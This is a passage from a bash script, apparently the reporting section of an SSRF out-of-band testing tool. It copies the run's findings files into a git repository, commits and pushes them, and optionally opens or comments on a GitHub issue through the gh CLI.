#    target repo, commit, push. With --gh-issue, also open or
#    comment on a GitHub issue in that repo via the gh CLI.
#    Skipped entirely if --git-repo wasn't passed or doesn't
#    point at a real repo.
# ----------------------------------------------------------
if [ -n "$GIT_REPO" ]; then
    section() { echo -e "\n${CYAN}== $1 ==${RESET}"; }
    section "GitHub Integration"

    if [ -d "$GIT_REPO" ]; then
        if [ -z "$RUN_ID" ]; then
            if [ -n "$SINGLE_URL" ]; then
                RUN_ID="$(printf '%s' "$SINGLE_URL" | sed 's|https\?://||;s|[^a-zA-Z0-9._-]|_|g' | cut -c1-40)_$(date +%Y%m%d_%H%M%S)"
            else
                RUN_ID="$(basename "$LIST_FILE" | sed 's/\.[^.]*$//')_$(date +%Y%m%d_%H%M%S)"
            fi
        fi
        GIT_OUTDIR="$GIT_REPO/findings/ssrf/$RUN_ID"
        mkdir -p "$GIT_OUTDIR"

        cp "$REPORT_FILE" "$GIT_OUTDIR/report.txt" 2>/dev/null || true
        cp "$CONFIRMED_FILE" "$GIT_OUTDIR/confirmed.json" 2>/dev/null || true
        cp "$NOISE_FILE" "$GIT_OUTDIR/noise.json" 2>/dev/null || true
        cp "$CORR_FILE" "$GIT_OUTDIR/correlation.tsv" 2>/dev/null || true
        cp "$SEND_LOG" "$GIT_OUTDIR/send.log" 2>/dev/null || true
        cp "$SUMMARY_FILE" "$GIT_OUTDIR/summary.json" 2>/dev/null || true

        cat > "$GIT_OUTDIR/SUMMARY.txt" << SUMMARY
SSRF OOB run: $RUN_ID
Date: $(date '+%Y-%m-%d %H:%M:%S')
Input: ${SINGLE_URL:-$LIST_FILE}
Total test cases: $TOTAL
Sent: $SENT_COUNT / Failed: $FAILED_COUNT
Confirmed OOB hits: $CONFIRMED_COUNT
Unmatched/noise interactions: $NOISE_COUNT
Session domain: $DOMAIN
SUMMARY

        if ( cd "$GIT_REPO" && \
             git add "findings/ssrf/$RUN_ID" 2>/dev/null && \
             git commit -m "ssrf-oob: $RUN_ID ($CONFIRMED_COUNT confirmed)" 2>/dev/null && \
             git push 2>/dev/null ); then
            success "Pushed to GitHub"
        else
            warn "git add/commit/push failed -- check remote/auth; results are still copied locally to $GIT_OUTDIR"
        fi

        # --gh-issue: summarize the run as a GitHub issue (or comment on
        # the existing open issue for this run) using the gh CLI.
        if [ "$GH_ISSUE" -eq 1 ]; then
            if have gh && gh auth status &>/dev/null; then
                remote_url=$(git -C "$GIT_REPO" remote get-url origin 2>/dev/null || true)
                slug=$(printf '%s' "$remote_url" | sed -nE 's#(github\.com[:/])?([^/]+/[^/]+?)(\.git)?$#\2#p')
                if [ -n "$slug" ]; then
                    issue_title="[ssrf-oob] $RUN_ID"
                    existing=$(gh issue list --repo "$slug" --state open --search "$issue_title in:title" --json number --jq '.[0].number' 2>/dev/null || true)
                    if [ -n "$existing" ]; then
                        if gh issue comment "$existing" --repo "$slug" --body-file "$GIT_OUTDIR/SUMMARY.txt" 2>/dev/null; then
                            success "Commented on existing issue #$existing in $slug"
                        else
                            warn "gh issue comment failed for $slug#$existing"
                        fi
                    elif gh issue create --repo "$slug" --title "$issue_title" --body-file "$GIT_OUTDIR/SUMMARY.txt" --label "enhancement" 2>/dev/null; then
                        success "Opened issue in $slug: $issue_title"
                    elif gh issue create --repo "$slug" --title "$issue_title" --body-file "$GIT_OUTDIR/SUMMARY.txt" 2>/dev/null; then
                        success "Opened issue in $slug: $issue_title"
                    else
                        warn "gh issue create failed for $slug (check repo + gh auth)"
                    fi
                else
                    warn "Could not parse a GitHub repo slug from origin remote '$remote_url' -- skipping --gh-issue"
                fi
            else
                warn "--gh-issue requires the gh CLI to be installed and authenticated (gh auth login) -- skipped"
            fi
        fi
    else
        warn "--git-repo '$GIT_REPO' is not a directory -- skipping git integration (results are still in $OUTDIR/)"
    fi
fi
